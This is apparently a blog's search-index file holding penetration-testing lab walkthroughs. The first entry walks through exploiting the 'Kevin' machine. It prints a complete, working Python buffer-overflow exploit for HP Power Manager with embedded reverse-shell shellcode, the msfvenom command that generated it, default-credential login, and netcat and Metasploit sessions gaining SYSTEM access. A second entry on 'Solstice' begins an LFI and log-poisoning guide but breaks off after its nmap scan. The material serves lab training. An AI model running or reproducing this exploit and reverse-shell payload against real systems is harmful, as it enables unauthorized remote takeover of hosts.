<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Kevin</title>
    <url>/2021/07/31/Kevin/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Kevin"><a href="#Exploitation-Guide-for-Kevin" class="headerlink" title="Exploitation Guide for Kevin"></a><strong>Exploitation Guide for Kevin</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>In this walkthrough, we’ll leverage default credentials and a public exploit against HP Power Manager. We’ll also successfully exploit it with a public Metasploit module.</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We’ll begin with a simple <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -p- 192.168.120.91</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:40 EDT</span><br><span class="line">Nmap scan report for 192.168.120.91</span><br><span class="line">Host is up (0.034s latency).</span><br><span class="line">Not shown: 65523 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">3573/tcp  open  tag-ups-1</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br><span class="line">49159/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 48.24 seconds</span><br><span class="line">root@kali:~# nmap -A -sV -p 80,135,139,445,3389,3573 192.168.120.91</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:45 EDT</span><br><span class="line">Nmap scan report for 192.168.120.91</span><br><span class="line">Host is up (0.032s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         GoAhead WebServer</span><br><span class="line">|_http-server-header: GoAhead-Webs</span><br><span class="line">| http-title: HP Power Manager</span><br><span class="line">|_Requested resource was http://192.168.120.91/index.asp</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389/tcp open  tcpwrapped</span><br><span class="line">|_ssl-date: 2020-03-27T00:46:50+00:00; +8h00m00s from scanner time.</span><br><span class="line">3573/tcp open  tag-ups-1?</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Vista|2012|10 (94%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows 7 (94%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (94%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (94%), Microsoft Windows Vista SP2 (94%), Microsoft Windows Server 2008 (94%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (94%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h44m59s, deviation: 3h30m00s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: KEVIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:8a:7d:41 (VMware)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::-</span><br><span class="line">|   Computer name: kevin</span><br><span class="line">|   NetBIOS computer name: KEVIN\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2020-03-26T17:46:33-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-03-27T00:46:34</span><br><span class="line">|_  start_date: 2020-03-27T00:39:28</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   33.45 ms 192.168.118.1</span><br><span class="line">2   28.82 ms 192.168.120.91</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 127.09 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Navigating to the default web page on port 80, we are redirected to <code>/index.asp</code> and discover that it is an instance of HP Power Manager application:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_1_KNxnfFuQ.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_1_KNxnfFuQ.PNG"></p>
<p>The publicly-listed credentials for this software are <code>admin / admin</code>.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_2_LNvkxvKM.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_2_LNvkxvKM.PNG"></p>
<p>We can log in with those credentials and navigate to the <strong>Help</strong> page in the main menu to discover that this is <strong>version 4.2 (Build 7)</strong>:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_3_ovgDCHII.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_3_ovgDCHII.PNG"></p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Shell-1-Universal-Buffer-Overflow"><a href="#Shell-1-Universal-Buffer-Overflow" class="headerlink" title="Shell #1: Universal Buffer Overflow"></a><strong>Shell #1: Universal Buffer Overflow</strong></h3><p>An exploit for this version is listed at <a href="https://www.exploit-db.com/exploits/10099">https://www.exploit-db.com/exploits/10099</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# searchsploit -t &quot;HP Power Manager&quot;</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                           |  Path</span><br><span class="line">                                                                         | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">HP Power Manager - &#x27;formExportDataLogs&#x27; Remote Buffer Overflow (Metasplo | exploits/cgi/remote/18015.rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overfl | exploits/windows/remote/16785.rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration Power Manager Administ | exploits/windows/remote/10099.py</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We’ll need to change the shellcode to a reverse shell, keeping in mind the <code>n00bn00b</code> egg and the potentially bad characters. Let’s generate the shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot; LHOST=192.168.118.3 LPORT=443</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed</span><br><span class="line">x86/alpha_mixed succeeded with size 710 (iteration=0)</span><br><span class="line">x86/alpha_mixed chosen with final size 710</span><br><span class="line">Payload size: 710 bytes</span><br><span class="line">Final size of c file: 3008 bytes</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\x89\xe2\xd9\xc6\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49&quot;</span><br><span class="line"></span><br><span class="line">*snip*</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Here’s our completed exploit code:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line"># CVE 2009-2685</span><br><span class="line"># Tested on Win2k3 Ent SP2 English, Win XP Sp2 English</span><br><span class="line"># Matteo Memelli ryujin __A-T__ offensive-security.com</span><br><span class="line"># www.offensive-security.com</span><br><span class="line"># Spaghetti &amp; Pwnsauce - 07/11/2009</span><br><span class="line">#</span><br><span class="line"># ryujin@bt:~$ ./hppowermanager.py 172.16.30.203</span><br><span class="line"># HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line"># ryujin __A-T__ offensive-security.com</span><br><span class="line"># [+] Sending evil buffer...</span><br><span class="line"># HTTP/1.0 200 OK</span><br><span class="line"># [+] Done!</span><br><span class="line"># [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell</span><br><span class="line"># ryujin@bt:~$ nc -v 172.16.30.203 4444</span><br><span class="line"># 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out</span><br><span class="line"># (UNKNOWN) [172.16.30.203] 4444 (?) open</span><br><span class="line"># Microsoft Windows [Version 5.2.3790]</span><br><span class="line"># (C) Copyright 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line"># C:\WINDOWS\system32&gt;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">print &quot;HP Power Manager Administration Universal Buffer Overflow Exploit&quot;</span><br><span class="line">print &quot;ryujin __A-T__ offensive-security.com&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">   HOST  = sys.argv[1]</span><br><span class="line">except IndexError:</span><br><span class="line">   print &quot;Usage: %s HOST&quot; % sys.argv[0]</span><br><span class="line">   sys.exit()</span><br><span class="line"></span><br><span class="line">PORT  = 80</span><br><span class="line">RET   = &quot;\xCF\xBC\x08\x76&quot; # 7608BCCF JMP ESP MSVCP60.dll</span><br><span class="line"></span><br><span class="line"># [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes:</span><br><span class="line"># [*] msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot; LHOST=192.168.118.3 LPORT=443</span><br><span class="line"># badchar = &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot;</span><br><span class="line">SHELL = (</span><br><span class="line">&quot;n00bn00b&quot;</span><br><span class="line">&quot;\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49&quot;</span><br><span class="line">&quot;\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a&quot;</span><br><span class="line">&quot;\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32&quot;</span><br><span class="line">&quot;\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49&quot;</span><br><span class="line">&quot;\x59\x6c\x58\x68\x4f\x72\x55\x50\x77\x70\x75\x50\x31\x70\x4f&quot;</span><br><span class="line">&quot;\x79\x59\x75\x46\x51\x6f\x30\x33\x54\x4c\x4b\x50\x50\x46\x50&quot;</span><br><span class="line">&quot;\x6e\x6b\x56\x32\x64\x4c\x4e\x6b\x43\x62\x66\x74\x4c\x4b\x44&quot;</span><br><span class="line">&quot;\x32\x74\x68\x56\x6f\x48\x37\x43\x7a\x77\x56\x65\x61\x6b\x4f&quot;</span><br><span class="line">&quot;\x6e\x4c\x57\x4c\x73\x51\x53\x4c\x36\x62\x36\x4c\x65\x70\x5a&quot;</span><br><span class="line">&quot;\x61\x7a\x6f\x34\x4d\x33\x31\x6a\x67\x39\x72\x38\x72\x30\x52&quot;</span><br><span class="line">&quot;\x76\x37\x6c\x4b\x71\x42\x62\x30\x6e\x6b\x51\x5a\x35\x6c\x4e&quot;</span><br><span class="line">&quot;\x6b\x42\x6c\x62\x31\x43\x48\x7a\x43\x47\x38\x46\x61\x5a\x71&quot;</span><br><span class="line">&quot;\x36\x31\x4c\x4b\x30\x59\x65\x70\x37\x71\x58\x53\x6e\x6b\x72&quot;</span><br><span class="line">&quot;\x69\x62\x38\x58\x63\x36\x5a\x52\x69\x4e\x6b\x57\x44\x4e\x6b&quot;</span><br><span class="line">&quot;\x66\x61\x79\x46\x74\x71\x69\x6f\x4e\x4c\x4a\x61\x48\x4f\x74&quot;</span><br><span class="line">&quot;\x4d\x46\x61\x68\x47\x30\x38\x4b\x50\x44\x35\x58\x76\x43\x33&quot;</span><br><span class="line">&quot;\x71\x6d\x49\x68\x75\x6b\x31\x6d\x34\x64\x51\x65\x4a\x44\x30&quot;</span><br><span class="line">&quot;\x58\x6c\x4b\x31\x48\x34\x64\x63\x31\x38\x53\x42\x46\x6c\x4b&quot;</span><br><span class="line">&quot;\x44\x4c\x62\x6b\x6c\x4b\x52\x78\x67\x6c\x77\x71\x6b\x63\x6e&quot;</span><br><span class="line">&quot;\x6b\x53\x34\x4e\x6b\x43\x31\x78\x50\x6e\x69\x63\x74\x31\x34&quot;</span><br><span class="line">&quot;\x57\x54\x61\x4b\x31\x4b\x35\x31\x71\x49\x53\x6a\x43\x61\x6b&quot;</span><br><span class="line">&quot;\x4f\x4b\x50\x71\x4f\x53\x6f\x62\x7a\x6e\x6b\x67\x62\x58\x6b&quot;</span><br><span class="line">&quot;\x6e\x6d\x73\x6d\x63\x58\x65\x63\x55\x62\x75\x50\x47\x70\x63&quot;</span><br><span class="line">&quot;\x58\x31\x67\x74\x33\x70\x32\x51\x4f\x72\x74\x52\x48\x30\x4c&quot;</span><br><span class="line">&quot;\x33\x47\x55\x76\x56\x67\x69\x6f\x68\x55\x4f\x48\x6c\x50\x37&quot;</span><br><span class="line">&quot;\x71\x57\x70\x73\x30\x64\x69\x68\x44\x51\x44\x36\x30\x61\x78&quot;</span><br><span class="line">&quot;\x65\x79\x6b\x30\x42\x4b\x55\x50\x69\x6f\x59\x45\x52\x70\x52&quot;</span><br><span class="line">&quot;\x70\x32\x70\x50\x50\x73\x70\x72\x70\x67\x30\x46\x30\x31\x78&quot;</span><br><span class="line">&quot;\x59\x7a\x76\x6f\x4b\x6f\x59\x70\x39\x6f\x49\x45\x7a\x37\x31&quot;</span><br><span class="line">&quot;\x7a\x55\x55\x75\x38\x4b\x70\x4d\x78\x73\x46\x63\x33\x45\x38&quot;</span><br><span class="line">&quot;\x44\x42\x35\x50\x75\x51\x6f\x4b\x6b\x39\x4a\x46\x53\x5a\x54&quot;</span><br><span class="line">&quot;\x50\x30\x56\x76\x37\x31\x78\x6e\x79\x6c\x65\x54\x34\x53\x51&quot;</span><br><span class="line">&quot;\x49\x6f\x58\x55\x4c\x45\x59\x50\x54\x34\x64\x4c\x6b\x4f\x70&quot;</span><br><span class="line">&quot;\x4e\x36\x68\x34\x35\x38\x6c\x73\x58\x4c\x30\x6f\x45\x4c\x62&quot;</span><br><span class="line">&quot;\x76\x36\x4b\x4f\x38\x55\x73\x58\x31\x73\x50\x6d\x30\x64\x63&quot;</span><br><span class="line">&quot;\x30\x6f\x79\x39\x73\x53\x67\x76\x37\x76\x37\x35\x61\x6c\x36&quot;</span><br><span class="line">&quot;\x43\x5a\x74\x52\x51\x49\x52\x76\x78\x62\x79\x6d\x71\x76\x39&quot;</span><br><span class="line">&quot;\x57\x70\x44\x71\x34\x75\x6c\x67\x71\x67\x71\x4c\x4d\x31\x54&quot;</span><br><span class="line">&quot;\x34\x64\x46\x70\x6f\x36\x57\x70\x37\x34\x61\x44\x32\x70\x43&quot;</span><br><span class="line">&quot;\x66\x51\x46\x33\x66\x42\x66\x51\x46\x62\x6e\x31\x46\x76\x36&quot;</span><br><span class="line">&quot;\x50\x53\x76\x36\x42\x48\x54\x39\x7a\x6c\x65\x6f\x6c\x46\x49&quot;</span><br><span class="line">&quot;\x6f\x78\x55\x4d\x59\x6b\x50\x50\x4e\x30\x56\x61\x56\x79\x6f&quot;</span><br><span class="line">&quot;\x46\x50\x65\x38\x73\x38\x4b\x37\x37\x6d\x63\x50\x39\x6f\x69&quot;</span><br><span class="line">&quot;\x45\x6d\x6b\x38\x70\x6e\x55\x4c\x62\x33\x66\x72\x48\x69\x36&quot;</span><br><span class="line">&quot;\x4c\x55\x4f\x4d\x4d\x4d\x69\x6f\x68\x55\x65\x6c\x55\x56\x73&quot;</span><br><span class="line">&quot;\x4c\x76\x6a\x4d\x50\x49\x6b\x49\x70\x33\x45\x53\x35\x4f\x4b&quot;</span><br><span class="line">&quot;\x67\x37\x75\x43\x64\x32\x42\x4f\x71\x7a\x37\x70\x50\x53\x59&quot;</span><br><span class="line">&quot;\x6f\x4b\x65\x41\x41&quot;)</span><br><span class="line"></span><br><span class="line">EH =&#x27;\x33\xD2\x90\x90\x90\x42\x52\x6a&#x27;</span><br><span class="line">EH +=&#x27;\x02\x58\xcd\x2e\x3c\x05\x5a\x74&#x27;</span><br><span class="line">EH +=&#x27;\xf4\xb8\x6e\x30\x30\x62\x8b\xfa&#x27;</span><br><span class="line">EH +=&#x27;\xaf\x75\xea\xaf\x75\xe7\xff\xe7&#x27;</span><br><span class="line"></span><br><span class="line">evil =  &quot;POST http://%s/goform/formLogin HTTP/1.1\r\n&quot;</span><br><span class="line">evil += &quot;Host: %s\r\n&quot;</span><br><span class="line">evil += &quot;User-Agent: %s\r\n&quot;</span><br><span class="line">evil += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br><span class="line">evil += &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;</span><br><span class="line">evil += &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;</span><br><span class="line">evil += &quot;Keep-Alive: 300\r\n&quot;</span><br><span class="line">evil += &quot;Proxy-Connection: keep-alive\r\n&quot;</span><br><span class="line">evil += &quot;Referer: http://%s/index.asp\r\n&quot;</span><br><span class="line">evil += &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br><span class="line">evil += &quot;Content-Length: 678\r\n\r\n&quot;</span><br><span class="line">evil += &quot;HtmlOnly=true&amp;Password=admin&amp;loginButton=Submit+Login&amp;Login=admin&quot;</span><br><span class="line">evil += &quot;\x41&quot;*256 + RET + &quot;\x90&quot;*32 + EH + &quot;\x42&quot;*287 + &quot;\x0d\x0a&quot;</span><br><span class="line">evil = evil % (HOST,HOST,SHELL,HOST)</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">print &#x27;[+] Sending evil buffer...&#x27;</span><br><span class="line">s.send(evil)</span><br><span class="line">print s.recv(1024)</span><br><span class="line">print &quot;[+] Done!&quot;</span><br><span class="line">print &quot;[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell&quot; % HOST</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s set up a netcat listener on port 443 and launch the Python exploit against the target.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# python exploit.py 192.168.120.91</span><br><span class="line">HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line">ryujin __A-T__ offensive-security.com</span><br><span class="line">[+] Sending evil buffer...</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line">[*] Check your shell at 192.168.120.91:4444 , can take up to 1 min to spawn your shell</span><br><span class="line">root@kali:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>After a few seconds we should receive our reverse shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.120.91: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.118.3] from (UNKNOWN) [192.168.120.91] 49170</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Shell-2-Metasploit-Module-hp-power-manager-filename"><a href="#Shell-2-Metasploit-Module-hp-power-manager-filename" class="headerlink" title="Shell #2: Metasploit Module hp_power_manager_filename"></a><strong>Shell #2: Metasploit Module hp_power_manager_filename</strong></h3><p>We could also leverage a public Metasploit module against this vulnerability.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/http/hp_power_manager_filename</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set RHOST 192.168.120.91</span><br><span class="line">RHOST =&gt; 192.168.120.91</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set LHOST 192.168.118.3</span><br><span class="line">LHOST =&gt; 192.168.118.3</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/http/hp_power_manager_filename):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS   192.168.120.91   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.118.3    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     443              yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows XP SP3 / Win Server 2003 SP0</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:443</span><br><span class="line">[*] Generating payload...</span><br><span class="line">[*] Trying target Windows XP SP3 / Win Server 2003 SP0...</span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.120.91</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.118.3:443 -&gt; 192.168.120.91:49167) at 2020-03-26 13:39:25 -0400</span><br><span class="line">[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3620 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>In some cases this module produces the following error:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:443</span><br><span class="line">[*] Generating payload...</span><br><span class="line">[*] Trying target Windows XP SP3 / Win Server 2003 SP0...</span><br><span class="line">[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>However, this is easily resolved by re-running the module.</p>
]]></content>
      <tags>
        <tag>walkthrough</tag>
      </tags>
  </entry>
  <entry>
    <title>Solstice</title>
    <url>/2021/07/31/Solstice/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="Exploitation-Guide-for-Solstice"><a href="#Exploitation-Guide-for-Solstice" class="headerlink" title="Exploitation Guide for Solstice"></a><strong>Exploitation Guide for Solstice</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>This machine is exploited by combining a LFI with a log poisoning attack. It is escalated with a world-writable file.</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p- -sV 192.168.120.167</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 16:27 EDT</span><br><span class="line">Nmap scan report for 192.168.120.167</span><br><span class="line">Host is up (0.043s latency).</span><br><span class="line">Not shown: 65428 closed ports, 96 filtered ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         pyftpdlib 1.5.6</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">3128/tcp  open  http-proxy  Squid http proxy 4.6</span><br><span class="line">8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">62524/tcp open  ftp         FreeFloat ftpd 1.00</span><br><span class="line">Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-8593"><a href="#Web-server-on-port-8593" class="headerlink" title="Web server on port 8593"></a><strong>Web server on port 8593</strong></h3><p>This web app appears to be under construction, with only a limited number of functionalities available to us.</p>
